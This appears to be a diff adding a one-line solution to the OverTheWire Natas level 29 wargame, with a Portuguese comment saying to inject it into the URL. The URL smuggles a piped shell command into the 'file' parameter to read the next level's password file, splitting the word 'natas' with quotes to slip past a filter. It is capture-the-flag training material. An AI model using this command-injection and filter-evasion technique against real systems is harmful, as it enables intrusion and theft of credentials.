@@ -1,0 +1,3 @@
+
+# Injetar na URL
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27
